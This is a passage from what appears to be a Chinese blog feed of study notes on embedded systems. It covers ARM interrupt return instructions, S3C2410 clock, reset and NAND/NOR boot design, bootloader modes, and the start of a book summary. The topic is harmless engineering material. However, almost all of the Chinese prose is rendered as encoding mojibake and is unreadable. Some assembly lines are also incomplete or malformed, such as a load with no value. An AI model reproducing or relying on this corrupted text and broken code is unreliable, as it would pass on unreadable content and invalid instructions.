&lt;li>å° SPSR å¤å¶å CPSRï¼æ³¨æ1ä¸2ççç¾ï¼ä¸è½ç¬ç«æ§è¡ï¼ç¨ä¸æ¡å¸¦â§çæä»¤æ§è¡ï¼æä¹çé½æ¯ä¸æ¡ï¼&lt;/li>
&lt;li>æ¸é¤ç¦æ­¢ä¸­æ­æ å¿,å¦æå®è¢«è®¾ç½®æä½¿è½&lt;/li>
&lt;li>ææä¿®æ¹è¿çç¨æ·å¯å­å¨å¿é¡»ä»å¤çç¨åºçä¿æ¤å æ ä¸­æ¢å¤ï¼å³åºæ ï¼ã&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>å¯¹ä¸­æ­åµå¥çå¤ç(æ³¨æ)ï¼&lt;/strong>&lt;/p>
&lt;p>ä¿å­å¨LRä¸­çPCå¼ï¼åè¯¥å¼è¿åæ¶çå¤çè¿ç¨ã
å½IRQå¼å¸¸ä¸­æ­äº§çæ¶ï¼ç¨åºè®¡æ°å¨pcçå¼å·²ç»æ´æ°ï¼å®æåå½åæä»¤åé¢ç¬¬3æ¡æä»¤ï¼å¯¹äºARMæä»¤ï¼å®æåå½åæä»¤å°åå 12å­èçä½ç½®ï¼å½IRQå¼å¸¸ä¸­æ­äº§çæ¶ï¼å¤çå¨å°å¼ï¼pc-4ï¼ä¿å­å°IRQå¼å¸¸æ¨¡å¼ä¸çå¯å­å¨lr_irqä¸­ï¼å®æåå½åæä»¤ä¹åçç¬¬2æ¡æä»¤ï¼å æ­¤è¿åæä½å¯ä»¥éè¿ä¸é¢æä»¤å®ç°ï¼&lt;code>subs pc, lr, \#4&lt;/code>&lt;/p>
&lt;p>æä¸¤ç§è¿åæºå¶ï¼&lt;/p>
&lt;p>å½è¿åå°åä¿å­å¨å½åå¼å¸¸æ¨¡å¼çr14æ¶ä½¿ç¨å¶ä¸­ä¸ç§æºå¶
å½è¿åå°åä¿å­å¨å æ æ¶ä½¿ç¨å¦ä¸ç§æºå¶ï¼è¿ä¸­æ­çæ¶åä¿å­çï¼ã
è®¿é®æºå¶
&lt;code>SUBS PC,R14_fiq ,\#4&lt;/code>
ï¼ä¸åæ¨¡å¼æä¸åçæä»¤ï¼è¿åPCçåæ¶è¿åCPSRï¼ä¸æ¡æä»¤å®ç°ï¼&lt;/p>
&lt;pre>&lt;code class="language-c">SUB LR,LR,\#4``
STMFD R13!ï¼{R0ï¼R4-R12ï¼LR}
&lt;/code>&lt;/pre>
&lt;p>å°å¯å­å¨åè¡¨ä¸­çå¯å­å¨R0ï¼R4å°R12ï¼LRå­å¥å æ ã&lt;/p>
&lt;pre>&lt;code class="language-c">LDMFD R13!,{R0ï¼R4-R12ï¼PC} â§
&lt;/code>&lt;/pre>
&lt;p>å°å æ åå®¹æ¢å¤å°å¯å­å¨R0ï¼R4å°R12ï¼PCï¼åæ¶SPSRå¤å¶å°CPSRã{â§}ä¸ºå¯éåç¼ï¼å½æä»¤ä¸ºLDMä¸å¯å­å¨åè¡¨ä¸­åå«R15ï¼éç¨è¯¥åç¼æ¶è¡¨ç¤ºï¼é¤äºæ­£å¸¸çæ°æ®ä¼ éä¹å¤ï¼è¿å°SPSRå¤å¶å°CPSRï¼ä¸æ¡æä»¤å®ç°ã&lt;/p>
&lt;p>ä»£ç æä»¤åæï¼&lt;/p>
&lt;pre>&lt;code class="language-c">AREA Initï¼CODEï¼READONLYï¼ä»£ç æ®µInitãåªè¯»
â¦â¦
CODE32 ï¼32ä½ARMæä»¤é
LDR R0ï¼ï¼NEXTï¼1 ï¼ç»R0èµå°åå¼
BX R0 ï¼ç¨åºè·³ï¼å¹¶å°å¤çå¨åæ¢å°Thumbå·¥ä½ç¶æ
â¦â¦
CODE16 ï¼ 16ä½thumbæä»¤é
NEXT LDR R3ï¼ï¼0x3FF ç»R3èµå¼
â¦â¦
END
&lt;/code>&lt;/pre>
&lt;p>é«çº§è¯­è¨åæ±ç¼è¯­è¨å½æ°é´çç¸äºè°ç¨:
æ±ç¼è°ç¨Cï¼&lt;/p>
&lt;pre>&lt;code class="language-c">IMPORT Main ;éç¥ç¼è¯å¨è¯¥æ å·ä¸ºä¸ä¸ªå¤é¨æ å·
AREA Init,CODE,READONLY ï¼å®ä¹ä¸ä¸ªä»£ç æ®µ
ENTRY ï¼å®ä¹ç¨åºçå¥å£ç¹
LDR R0,=0x3FF0000 ï¼åå§åç³»ç»éç½®å¯å­å¨
LDR R1,=0xE7FFFF80
STR R1,[R0]
LDR SP,=0x3FE1000 ï¼åå§åç¨æ·å æ 
BL Main ï¼**è·³è½¬å°Mainï¼ï¼å½æ°å¤çC/C++ä»£ç æ§è¡**
END ï¼**æ è¯æ±ç¼ç¨åºçç»æ**
ä»¥ä¸çç¨åºæ®µå®æä¸äºç®åçåå§åï¼ç¶åè·³è½¬å°Mainï¼ï¼å½æ°ææ è¯çC/C ï¼ï¼ä»£ç å¤æ§è¡ä¸»è¦çä»»å¡ï¼æ­¤å¤çMainä»ä¸ºä¸ä¸ªæ å·ï¼ä¹å¯ä½¿ç¨å¶ä»åç§°ã
AREA Init , CODE , READONLY ;å·²å®ä¹ä»£ç æ®µ
ENTRYï¼ç¨åºå¥å£
LDR R0, =0x3ff5000ï¼R0èµå¯å­å¨å°åå¼
LDR R1, 0xï¼è¦ç»å¯å­å¨èµçå¼
STR R1,[R0]ï¼èµå¼
LDR R0, =0x3ff5008
LDR R1, 0x01
STR R1,[R0]ï¼ç»å¦ä¸ä¸ªå¯å­å¨èµå¼çè¿ç¨
BL PROCï¼è·³è½¬è³æ å·ä¸ºPROCçç¨åºåºæ§è¡
:
:
:
:
PROC
:
:
MOV PC, LR //å°LRä¿å­çç¨åºæéè¿åï¼å³**è·³å°BLä¸ä¸å¥æ¥çæ§è¡**
:
:
END
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h3 id="arm-2410è®¾è®¡ç¸å³">ARM 2410è®¾è®¡ç¸å³&lt;/h3>
&lt;h4 id="cpuå¤è®¾å¤è®¾æ§å¶å¨æ¶åºå¯å­å¨çç¸äºå³ç³»">CPUãå¤è®¾ãå¤è®¾æ§å¶å¨ãæ¶åºãå¯å­å¨çç¸äºå³ç³»ï¼&lt;/h4>
&lt;p>CPUä¸å¤è®¾æ§å¶å¨ææå¾®å¤çå¨ï¼å¾®å¤çå¨å¨æ ¸å¿æ¿ï¼æå°ç³»ç»ï¼ä¸åæ¥ä½ç¨ï¼å°å¼èéåæå¤è®¾æ¥å£å ä¸çµå¹³è½¬æ¢ç­å°±æ¯å¤å´æ¿ï¼å¤è®¾éè¿å¤å´æ¿è¿æ¥è³å¤è®¾æ§å¶å¨ãCPUéè¿å¯å­å¨ç¼ç¨æ§å¶å¤è®¾æ§å¶å¨äº§çæ¶åºæ§å¶å¤è®¾ãè¥æ¯æ²¡æå¤è®¾æ§å¶å¨ï¼åéè¦CPUèªå·±äº§çæ¶åºæ¥ä¸å¤è®¾äº¤äºï¼è¿ç§æ¶åºç¸å½äºä¸ç§çº¦å®å¥½çææè¡¨ç¤ºï¼ç¸å½äºâè¯­è¨âæèâéä¿¡åè®®âï¼&lt;/p>
&lt;p>&lt;strong>ä¾å¦&lt;/strong>ï¼è¥æ¯2410ä¸ä¸ä¸ªå¸¦æIICæ¥å£çå¨ä»¶éä¿¡ï¼åªéè¦è¿æ¥èµ·æ¥ï¼å¯¹IICè¿è¡å¯å­å¨ç¼ç¨ï¼æ§å¶å®ä»¬ä¹é´çå·¥ä½æ¨¡å¼ï¼å¯è½æ¶åæ°æ®å°±åæäºå¨ä¸­æ­ä¸­è¯»åå¯å­å¨æä½ï¼å±è½äºIICè§å®çéä¿¡ç»èãè¥æ¯51åçæºè¦ä¸IICéä¿¡çè¯ï¼å°±å¤æå¤äºï¼é¦åè¦ä»ç»éè¯»IICçåè®®ï¼ä¸å®¹ä¸æ¯«å·®éï¼ç¶åç¨IOå£æ¨¡ææ¶åºï¼CPUçå·¥ä½éå¾å¤§ã&lt;/p>
&lt;h4 id="å¯å­å¨ç¼ç¨çæ¬è´¨å¦ä½è·åå¯å­å¨çéç½®">å¯å­å¨ç¼ç¨çæ¬è´¨ï¼å¦ä½è·åå¯å­å¨çéç½®ï¼&lt;/h4>
&lt;p>å¯å­å¨ç¼ç¨çæ¬è´¨æ¯CPUæ§å¶å¤è®¾å¯å­å¨å·¥ä½æ¨¡å¼çæ¹æ³ãå¯ä»¥æ³è±¡å¯å­å¨çæ¯ä¸ä½è¯å®æ¯å¤è®¾æ§å¶å¨åè½æ¨¡åä¸­çä¸ä¸ªä¸ªâå¼å³âï¼ç»æä¸ä½èµå¼0æè1ï¼å°±ç¸å½äºä½¿è½æå³é­æä¸ä¸ªåè½ã&lt;/p>
&lt;h4 id="2410æå°çµè·¯è®¾è®¡æ¶æ¯éæ©å¯å¨éæ©æ°æ®å®½åº¦">2410æå°çµè·¯è®¾è®¡ï¼ï¼æ¶æ¯éæ©ãå¯å¨éæ©ãæ°æ®å®½åº¦ï¼&lt;/h4>
&lt;p>ä¸ä¸è¬çARMç³»ç»ç¸åï¼é½éè¦å¾®å¤çå¨ãçµæºãæ¶æ¯ãå¤ä½ãå­å¨å¨ï¼flashãSDRAMï¼ãJTAGæ¥å£ç­ï¼å·ä½æåµå¦ä¸ï¼ï¼éè¦å¯¹OM0åOM1éç½®çµå¹³ä»¥å³å®å¯å¨æ¹å¼ï¼å¯¹OM2åOM3éç½®çµå¹³ä»¥å³å®æ¶éæºãï¼&lt;/p>
&lt;ul>
&lt;li>çµæºè®¾è®¡ï¼å¤çå¨ç¨1.8Vï¼RTCç»æ¶éæ¨¡åä¾çµ1.8Vï¼å­å¨å¨åæ®éIOç¨3.3Vï¼ADCæ¨¡åç¨3.3Vï¼å¯è§æå°ç³»ç»æå°è¦ç¨3.3å1.8ä¸¤ç§ç´æµç¨³åãè¯¾ç¨å®éªä¸­çµæºçµå5Vï¼åå«ç¨LM1085ç¨³å3.3Vï¼ç¨AS1117ç¨³å1.8Vã&lt;/li>
&lt;li>æ¶æ¯è®¾è®¡: 2410çæ¶éæ§å¶é»è¾å¯ä»¥äº§çç³»ç»æéè¦çæ¶éï¼åæ¬CPUçFCLKï¼åAHBæ»çº¿çHCLKï¼APBçPCLKãåé¨æä¸¤ä¸ªéç¸ç¯PLLï¼MPLLæä¾åä¸ä¸ªï¼UPLLç»USBæä¾48MHZçæ¶éã&lt;/li>
&lt;li>ä¸»æ¶éæºï¼UPLLåMPLLçæ¶éæºï¼å¯ä»¥éæ©æ¯æ¥èªå¤é¨æ¶éè¿æ¯å¤é¨æ¶æ¯ï¼è¿æ¯ç±OM2åOM3çç®¡èç¡®å®çï¼å¯ä»¥OM2åOM3åæ¶æ¥ä½çµå¹³ï¼éæ©å¤é¨æ¶æ¯ï¼æ¶æ¯å ä¸15pFèµ·æ¯çµå®¹ï¼ç»è¿éç¸ç¯åé¢å¯ä»¥è¾¾å°ï¼ã&lt;/li>
&lt;li>å¤ä½çµè·¯è®¾è®¡:å¯ä»¥å¨nRESETç«¯è®¾è®¡å51åçæºé£æ ·çé»å®¹å¤ä½çµè·¯ï¼ä½ä¸ºäºç¨³å®ï¼å¯ä»¥ä½¿ç¨å¤ä½è¯çå¦MAX811æIMP811ã&lt;/li>
&lt;li>JTAGæ¥å£è®¾è®¡: æ20éå14éä¸¤ç§JTAGæ¥å£ã&lt;/li>
&lt;li>å­å¨å¨è®¾è®¡: 2410æèªå·±çå­å¨å¨æ§å¶å¨ï¼å¹¶ä¸è§å®äºåªäºbankç©ºé´æ¯RAMåªäºæ¯FLASHï¼å­å¨å¨è¯çä¸¥æ ¼æç§DATASHEETä¸çè¦æ±åæ æçå¼èè¿æ¥æ¹å¼ä¸å­å¨å¨æ§å¶å¨çå­å¨å¨æ¥å£ç¸è¿å°±å¯ä»¥ï¼æ§å¶å¨ä¼æ ¹æ®å°åäº§çè¯»åå­å¨å¨è¯ççæ¶åºï¼å®æå­åæ°æ®çæä½ã&lt;/li>
&lt;/ul>
&lt;h4 id="2410norånandå¯å¨è¿ç¨åæ">2410norånandå¯å¨è¿ç¨åæï¼&lt;/h4>
&lt;p>&lt;code>NOR flash&lt;/code>:è¯»åéåº¦é«ãèæ¦åéåº¦ä½ï¼å®¹éå°ï¼ä»·æ ¼é«ï¼å°åçº¿åæ°æ®çº¿åå¼ï¼éç¨SRAMæ¥å£ã
&lt;code>NAND flash&lt;/code>:è¯»éåº¦ä¸å¦NORflash
ä½æ¯æ¦åéåº¦é«ï¼å®¹éå¤§ï¼ä»·æ ¼ä½ï¼æåä»£ç¡¬ççè¶å¿ï¼ä½æ¯å°åçº¿åæ°æ®å¤ç¨ï¼éè¦ç¨åºéåæè½è¯»åæ°æ®ãå¯ä»¥éè¿è·³çº¿è®¾ç½®æ¶ä»NAND FLASHå¯å¨è¿æ¯ä»NOR FLASHå¯å¨ã&lt;/p>
&lt;blockquote>
&lt;p>NANDå¯å¨çä¼å¿ï¼ä¾¿å®ãå®¹éå¤§ãä½æ¯è¯»åé»è¾ä¸è½ç¨ç¡¬ä»¶äº§çï¼ä¹å°±æ¯æ²¡åæ³æ¥å°BANKç©ºé´éï¼å¿é¡»æç¨åºéåæè½è¯»åï¼æä¸é¨çæ§å¶å¨æ¥å£ï¼è¯å®è¦å¯å­å¨ç¼ç¨å ä¸ç¨åºéåæè½è¯»åï¼æ²¡æPCçæ ¹æ­£èçº¢ï¼ï¼æä»¥çè®ºä¸å®æ¯ä¸å¯ä»¥ç¨æ¥å¯å¨ç³»ç»çï¼å ä¸ºé£ä¹åä»ä¹ç¨åºé½æ²¡æï¼è¦æ³è¯»åå®å¿é¡»æ¯ç³»ç»è£è½½å®äºèä¸æç¨åºäºãä½æ¯ä¸æéç¨äºSRAMæ å°è§£å³äºè¿ä¸ªé®é¢ï¼ä¸é¢å°±æ¯è¿ä¸ªè¿ç¨ï¼&lt;/p>
&lt;/blockquote>
&lt;p>çµè·¯ä¸­ä½¿&lt;code>OM1&lt;/code>å&lt;code>OM0&lt;/code>é½æ¥ä½çµå¹³ï¼ä»&lt;code>NAND FLASH&lt;/code>ä¸­å¯å¨ãï¼2410æNAND FLASHæ§å¶å¨ï¼è¿æ¥NAND Flashè¯çï¼äº§çè¯»åæ¶åºï¼&lt;/p>
&lt;p>å¨è¯¥æ¨¡å¼ä¸ï¼2410çå4KBå°åç©ºé´å¯¹åºä¸ä¸ªåå­å«åâèµ·æ­¥ç³âçSRAMï¼ç³»ç»å¯å¨æ¶ï¼èªå¨å°NAND FLASHçå4KBæ°æ®å è½½å°èµ·æ­¥ç³ä¸­ï¼ç¶åç³»ç»èªå¨æ§è¡è¿äºå¯å¨å¼å¯¼ä»£ç ï¼CPUä»åé¨RAMç0x00000000ä½ç½®å¼å§å¯å¨ãè¿ä¸ªè¿ç¨ä¸éè¦ç¨åºå¹²æ¶ãä¹å°±æ¯ç±»ä¼¼äºSTARTUP.Sçåè½ï¼åå§åå¼å¸¸åéè¡¨ãå æ ãå°NAND FLASHä¸­çä»£ç (æä»£ç æ¯æå½)æ·è´å°SDRAMä¸­è¿è¡ã&lt;/p>
&lt;h4 id="nor-flash">NOR FLASH&lt;/h4>
&lt;p>éç¨ççæ¯SRAMæ¥å£ï¼å¯ä»¥ç´æ¥å°å­å¨å¨æ§å¶å¨ä¸ï¼ARMåæ ¸äº§ççæ¶åºè½å¯¹å¶è¯»åãå°bank0ä¸æ¥ä¸NORflashè¯çãä¸çµäº§çå¤ä½å¼å¸¸åä¼èªå¨ä»NOR
flashä¸­å¯å¨ã&lt;/p>
&lt;h4 id="2410çä¸­æ­å¤çæµç¨">2410çä¸­æ­å¤çæµç¨ï¼&lt;/h4>
&lt;p>é¦ååºè¯¥æç¡®2410ä¸ARMåæ ¸çå¼å¸¸å¤çç³»ç»çè§è²ï¼æ ¹æ®ä¹åçARMå¼å¸¸å¤çæµç¨ï¼æä»¬æ¸æ¥æäºäºåªäºæ¯CPUçç¡¬ä»¶æºå¶ã2410éè¿ä¸­æ­æ§å¶å¨åè®¸ä»¥ä¼åçº§çæ¹å¼å°å åä¸ªä¸­æ­æºå±åç¨ä¸ä¸ªIRQãä¸ä¸ªä¸­æ­ç³è¯·æåºåï¼IRQå¼å¸¸åçï¼åæ¢æ¨¡å¼ãä¿å­CPSRãä¿å­PCï¼ç¶åè·³è½¬å°handleIRQå½æ°ï¼ç¶åè·³è½¬å°ISRIRQ(è¿åªæ¯ä¸ä¸ªå¤§æ¦æµç¨ï¼ä¹è®¸ä¼å®ä¹æ´å¤çè·³è½¬)æ ¹æ®ä¸­æ­æºåéè¡¨çé¦å°åååç§»éå¯å­å¨æ¾åºå°åºæ¯åªä¸ªä¸­æ­åçäºãç¶åè·³è½¬å°ç¸åºçä¸­æ­å¤çå½æ°ï¼æ¯å¦è·³å°ä¸²å£ä¸­æ­ï¼è¿å¯ä»¥æ ¹æ®æèµ·ä½ï¼å³ä¸­æ­æ å¿ä½ï¼åæ¬¡å¤æ­å°åºæ¯æ¥æ¶ä¸­æ­è¿æ¯åéå®æä¸­æ­ãä¹å°±æ¯è¯´2410å¤çæµç¨é¤äºARMå¯¹å¼å¸¸çååºæ¯ç¡¬ä»¶æºå¶å¤ï¼å¶ä½çé½æ¯ä»£ç å®ç°çãæä»¬å¨ç¼ç¨çæ¶åæ²¡æåçè¯ï¼é£ä¹æ¯ç¼è¯å¨å è¿å»çã&lt;/p>
&lt;h4 id="2410å¯¹åµå¥çå¤ç">2410å¯¹åµå¥çå¤ç&lt;/h4>
&lt;p>æ¯èµ·2410çå¤çæµç¨ä¸åçæ¯ï¼å ä¸ºæäºä¸­æ­æ§å¶å¨ï¼è¿å°±æ¯å®ç°é«ä¼åçº§åµå¥çç¡¬ä»¶åºç¡ï¼å ä¸ºæ¯ä¸æ¬¡è¿å¥å¼å¸¸æ¨¡å¼ç¨æ·é½ä¼ä¿å­ç¯å¢ï¼è¿å°±æ¯ä¸­æ­åµå¥çè½¯ä»¶åºç¡ãCPUçå¼å¸¸å¤çæºå¶æ»æ¯é£äºï¼å¾æç¡®çãææ­£å¨æ§è¡ä¸ä¸ªä¸­æ­æå¡ç¨åºï¼ç¶ååæ¬¡åçå¼å¸¸ï¼ä¿å­ï¼è·³è½¬ï¼CPUï¼ãåæ¬¡å¤æ­æ¯åªä¸ªä¸­æ­ï¼è¿å»ä¹ååæ ï¼è¿è¡å¦ä¸ä¸ªä¸­æ­çæå¡ç¨åºï¼è¿è¡å®è¿åï¼è¿æ¯å°±æ¯è¿åå°ä¸ä¸ä¸ªä¸­æ­äºãä¸ä¸ä¸ªä¸­æ­è¿è¡å®ï¼ä¸è¿åå°±æ¯è¿ååçå¼å¸¸åçç¶æã&lt;/p>
&lt;p>S3C2410çä¸²å£ãç«¯å£ãå¤é¨ä¸­æ­ãADç­åå¯å­å¨çç¼ç¨è½åï¼ä¼è¯»datasheetãä¼ç¼ç¨ãä½ä¸ãå®éªçç¸å³ä»£ç ï¼
å¯å­å¨çèµå¼æä»¤&lt;/p>
&lt;pre>&lt;code class="language-c">LDR R0ï¼=GPHCON
LDR R1,=0X2AFAAA
STR R1ï¼[R0]
&lt;/code>&lt;/pre>
&lt;h4 id="æ¶éçé¨ççç¸å³æ¦å¿µ">æ¶éãçé¨ççç¸å³æ¦å¿µ&lt;/h4>
&lt;ul>
&lt;li>æ¶é: æ´ä¸ªç³»ç»æä¾åæ­¥èå²ï¼åäººçèæä¸æ ·ã&lt;/li>
&lt;li>çé¨çï¼å¶å®æ¯ä¸ä¸ªè®¡æ°å¨ï¼å½å®è®¡æ°æº¢åºçæ¶åï¼ä¼ä½¿ç³»ç»å¤ä½ï¼æä»¥å®çä½ç¨æ¯é²æ­¢ç³»ç»æ­»æºãæå¼çé¨çä¹åï¼å½ä»£ç è·é£æèé·å¥æ­»å¾ªç¯ä¹åï¼å°±ä¸è½åçï¼ä¹å°±æ¯ä¸è½æ¸é¤è®¡æ°å¼ï¼é£ä¹å®å°±ä¼ä½¿ç³»ç»éå¯ã&lt;/li>
&lt;li>VIVI&lt;/li>
&lt;/ul>
&lt;h4 id="ä»ä¹æ¯bootloader">ä»ä¹æ¯bootloader&lt;/h4>
&lt;p>Bootloaderï¼ä¸ºå¼å¯¼å è½½ç¨åºï¼æ¯åµå¥å¼ç³»ç»å çµåè¿è¡çç¬¬ä¸æ®µä»£ç ï¼ç¸å½äºPCæºçBIOSã
Bootloaderå¨ç³»ç»ä¸­çä½ç½®ï¼ éå¸¸åºåå¨ç¡¬ä»¶ä¸çæä¸ªåºæå­å¨è®¾å¤ä¸ï¼å çµåèªå¯å¨ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-Linux-Embedded%20-System-Design/2018-10-04-16-04-02.png" alt="">&lt;/p>
&lt;p>&lt;strong>Bootloaderåè½&lt;/strong>ï¼ åå§åï¼ç»CPUåéçå·¥ä½ç¯å¢ï¼ç¸å½äºSTARTUP.Sï¼ï¼ä»¥ä¾¿ä¸ºæç»è°ç¨æä½ç³»ç»åæ ¸æç¨æ·åºç¨ç¨åºå¢ãå è½½åæ ¸ï¼ä¸è½½åæ ¸æèæ ¹æä»¶ç³»ç»ã&lt;/p>
&lt;h4 id="bootloaderæä½æ¨¡å¼">Bootloaderæä½æ¨¡å¼&lt;/h4>
&lt;p>æå¯å¨å è½½åä¸è½½ä¸¤ç§æ¨¡å¼ã&lt;/p>
&lt;ul>
&lt;li>å¯å¨å è½½æ¨¡å¼æ¯Bootloaderçæ­£å¸¸å·¥ä½æ¨¡å¼ï¼å¨åµå¥å¼äº§ååå¸çæ¶ä¾¯ï¼Bootloaderå¿é¡»å·¥ä½å¨è¿ç§æ¨¡å¼ä¸ãå³åå§åCPUçå·¥ä½ç¯å¢ä¹åï¼å°åæ ¸å¦RAMæ§è¡ã&lt;/li>
&lt;li>ä¸è½½æ¨¡å¼ï¼ç®æ æºä¸çBootloaderå°éè¿ä¸²å£è¿æ¥æç½ç»è¿æ¥ç­éä¿¡ææ®µä»ä¸»æºä¸è½½æä»¶ãä¸»è¦æ¯ä¸è½½åæ ¸æ ååæ ¹æä»¶ç³»ç»æ åç­ãä»ä¸»æºä¸è½½çæä»¶éå¸¸é¦åè¢«Bootloaderä¿å­å°ç®æ æºçRAMä¸­ï¼ç¶ååè¢«Bootloaderåå°ç®æ æºä¸çFLASHç±»åºæå­å¨è®¾å¤ä¸­ãBootloaderçè¿ç§æ¨¡å¼éå¸¸å¨ç¬¬ä¸æ¬¡å®è£åæ ¸ä¸æ ¹æä»¶ç³»ç»æ¶è¢«ä½¿ç¨ï¼æ­¤å¤ï¼ä»¥åçç³»ç»æ´æ°ä¹ä¼ä½¿ç¨å°è¿ç§å·¥ä½æ¨¡å¼ã&lt;/li>
&lt;/ul>
&lt;h4 id="bootloaderå¯å¨è¿ç¨">Bootloaderå¯å¨è¿ç¨&lt;/h4>
&lt;p>ä¸çµä¹åï¼åå¯å¨CPUå³æ§è¡startup.sç±»ä¼¼åè½ä»£ç ï¼éç½®ä¸­æ­ãåå§åå æ ãæ·è´ä»£ç ç­ï¼ï¼ç¶åè¿è¡å è½½åæ ¸çåå¤è³å°åå§åä¸ä¸ªä¸²å£ï¼ä»¥ä¾¿åç»ç«¯ç¨æ·åé¦æ°æ®ãæ£æµç³»ç»åå­æ å°ï¼åªäºæ¯å¯ç¨çRAMï¼å¨è¿ä¸æ­¥ä¹åï¼å°æ£æµå¤é¨æé®ï¼ææé®æä¸å°è¿å¥ä¸è½½æ¨¡å¼ï¼æ²¡ææé®çè¯å°æ§è¡ä¸é¢çæ­¥éª¤ï¼å è½½åæ ¸ï¼&lt;/p>
&lt;ul>
&lt;li>å°kenelåæ ¹æä»¶ç³»ç»ä»flashè°å¥RAM&lt;/li>
&lt;li>ä¸ºåæ ¸å¯å¨è®¾ç½®åæ°&lt;/li>
&lt;li>è°ç¨åæ ¸ã&lt;/li>
&lt;/ul></description></item><item><title>åµå¥å¼ç³»ç»è®¾è®¡è¯¾ç¨</title><link>http://www.guozet.me/post/Linux-Embedded-System-Design/</link><pubDate>Mon, 01 Aug 2016 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Embedded-System-Design/</guid><description>&lt;p>ãåµå¥å¼ç³»ç»è®¾è®¡ãæ¦è¿°&lt;/p>
&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>è¿æ¯ãåµå¥å¼ç³»ç»è®¾è®¡ãè¿æ¬ä¹¦ç±çåå®¹å°ç»ï¼ä¸»è¦ä»ç»äºåµå¥å¼ç³»ç»æ¶æä¸­çç³»ç»é¨åã&lt;/p>
&lt;h1 id="ä¹¦ç±åå®¹å°ç»æè¦">ä¹¦ç±åå®¹å°ç»æè¦&lt;/h1>
&lt;p>åä¸ºä¸¤ä¸ªé¨åä»ç»ï¼&lt;/p>
&lt;ul>
&lt;li>åµå¥å¼ç³»ç»è®¾è®¡é¨åï¼ARMæ¶æé¨å&lt;/li>
&lt;li>åµå¥å¼ç³»ç»è®¾è®¡é¨å&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="åµå¥å¼ç³»ç»çå®ä¹">åµå¥å¼ç³»ç»çå®ä¹&lt;/h4>
&lt;p>ä»¥åºç¨ä¸ºä¸­å¿ãä»¥è®¡ç®æºææ¯ä¸ºåºç¡ãè½¯ç¡¬ä»¶å¯è£åªãéåºåºç¨ç³»ç»å¯¹åè½ãå¯é æ§ãææ¬ãä½ç§¯ãåèä¸¥æ ¼è¦æ±çä¸ç¨è®¡ç®æºç³»ç»ãâåµå¥âãâä¸ç¨âãâè®¡ç®æºâ&lt;/p>
&lt;h4 id="åµå¥å¼ç³»ç»çè½¯ç¡¬ä»¶ç»æä»¥åä¸»è¦ç¹ç¹">åµå¥å¼ç³»ç»çè½¯ãç¡¬ä»¶ç»æï¼ä»¥åä¸»è¦ç¹ç¹ï¼&lt;/h4>
&lt;ul>
&lt;li>è½¯ä»¶ï¼ä»åºå±å°ä¸å±ï¼bootloaderç­ç³»ç»åå§åå¼å¯¼ç¨åºãè®¾å¤é©±å¨å±ï¼åæ¬é©±å¨ç¨åºãæ¿çº§æ¯æåBSPç­ï¼ãæä½ç³»ç»ãç¨æ·åºç¨ç¨åºãï¼åºå±ä¸ºä¸å±æä¾æå¡ï¼&lt;/li>
&lt;li>å¼åè½¯ä»¶ï¼å³éæå¼åç¯å¢ï¼asemmbler&amp;amp;&amp;amp;compiler&amp;amp;&amp;amp;linker&amp;amp;&amp;amp;debugger&amp;amp;&amp;amp;loaderï¼&lt;/li>
&lt;li>ç¡¬ä»¶ç»æï¼æ ¸å¿æ¿+å¤å´æ¿+å¤è®¾(æ ¸å¿æ¿ï¼å¾®æ§å¶å¨ï¼CPUåå¤è®¾æ¥å£ãå¤è®¾æ§å¶å¨ï¼ãçµæºãæ¶éãå¤ä½ãSDRAMãflashãå¤å´æ¿é¢åå¤å´è®¾å¤ï¼ä¸è¬æ¯å¼èçéåãçµå¹³è½¬æ¢çµè·¯ãå¤å´è®¾å¤ã)ï¼å½ç¶ä¹å¯ä»¥å°æ ¸å¿æ¿åå¤å´æ¿æ¾å¨ä¸èµ·ã&lt;/li>
&lt;li>ç¡¬ä»¶ç¹ç¹ï¼éå¸¸ç±åµå¥å¼å¤çå¨ååµå¥å¼å¤å´è®¾å¤ç»æï¼é«åº¦éæï¼å¸¸éç¨SOCè®¾è®¡æ¹æ³ï¼å¯¹åèãä½ç§¯ç­æä¸¥æ ¼è¦æ±ï¼å®å¶æ§å³å®äºå®çå¯è£åªæ§ï¼æ²¡æåè®¡ç®æºé¢åçåæ­ï¼è§£å³æ¹æ¡ä¸å¯ä¸ã&lt;/li>
&lt;li>è½¯ä»¶ç¹ç¹ï¼éç¨äº¤åå¼åæ¹å¼ï¼ç³»ç»è½¯ä»¶å±æ¬¡åæï¼æä½ç³»ç»ä¸ºç¨æ·ç¨åºæä¾æ åAPIï¼æä¾å¾å½¢æ¥å£åæä»¶ç³»ç»ãç¨æ·è°ç¨ç³»ç»æå¡ï¼ç³»ç»è°ç¨è®¾å¤é©±å¨ä»èæçºµç¡¬ä»¶ã&lt;/li>
&lt;/ul>
&lt;h4 id="åµå¥å¼ç³»ç»äº§åè®¾è®¡çåºæ¬æµç¨">åµå¥å¼ç³»ç»äº§åè®¾è®¡çåºæ¬æµç¨ï¼&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>éæ±åæï¼&lt;/p>
&lt;ul>
&lt;li>åè½æ§éæ±æ¯ç³»ç»çåºæ¬åè½ï¼å¦è¾å¥è¾åºä¿¡å·ãæä½æ¹å¼ç­ï¼&lt;/li>
&lt;li>éåè½æ§éæ±åæ¬ç³»ç»æ§è½ãææ¬ãåèãä½ç§¯ãééç­å ç´ ã&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>è§æ ¼è¯´æï¼ç²¾ç¡®å°åæ å®¢æ·çéæ±å¹¶ä¸ä½ä¸ºè®¾è®¡æ¶å¿é¡»æç¡®éµå¾ªçè¦æ±ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä½ç³»ç»æè®¾è®¡ï¼æè¿°ç³»ç»å¦ä½å®ç°æè¿°çåè½åéåè½éæ±ï¼åæ¬å¯¹ç¡¬ä»¶ãè½¯ä»¶åæ§è¡è£ç½®çåè½ååä»¥åç³»ç»çè½¯ä»¶ãç¡¬ä»¶éåç­ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è½¯ç¡¬ä»¶è®¾è®¡ï¼åºäºä½ç³»ç»æï¼å¯¹ç³»ç»çè½¯ä»¶ãç¡¬ä»¶è¿è¡è¯¦ç»è®¾è®¡ã&lt;/p>
&lt;/li>
&lt;li>
